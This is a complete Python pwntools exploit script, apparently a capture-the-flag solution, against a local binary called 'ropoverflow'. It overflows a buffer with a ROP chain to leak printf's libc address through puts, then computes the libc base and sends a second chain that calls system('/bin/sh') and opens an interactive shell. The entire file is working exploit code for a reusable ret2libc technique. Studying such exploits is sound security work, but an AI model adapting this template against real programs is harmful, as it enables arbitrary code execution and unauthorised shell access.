import pwn
import sys

elf = pwn.context.binary = pwn.ELF('./ropoverflow')

# io = pwn.gdb.debug('./ropoverflow', gdbscript='''
# continue
# ''')

io = elf.process()
rop = pwn.ROP(elf)
libc = elf.libc
retAddr = int("40101a",16)
popRDI = hex(rop.rdi.address)
putsPLT = elf.plt.puts
printfGOT = elf.got.printf
main = elf.symbols.main

print(io.recv(100000).decode("utf-8"))
#Send padding
padding = 202

leakPayload = b"".join(
    [
        b'A' * padding,
        pwn.p64(int(popRDI,16)),
        pwn.p64(printfGOT),
        pwn.p64(putsPLT),
        pwn.p64(main)
    ]
)
io.sendline(leakPayload)

io.recvline()
io.recvline()

leakedAddr = pwn.u64(io.recvline().strip().ljust(8,b"\x00"))
print(hex(leakedAddr))

libc.address = leakedAddr - libc.symbols.printf
system = libc.symbols.system
binSH = next(libc.search(b'/bin/sh'))

payload = b"".join(
    [
        b'A' * padding,
        pwn.p64(int(popRDI,16)),
        pwn.p64(binSH),
        pwn.p64(retAddr),
        pwn.p64(system),
        pwn.p64(0x0)
    ]
)
print(payload)
pwn.write("payloadFile", payload)
io.sendline(payload)
io.interactive()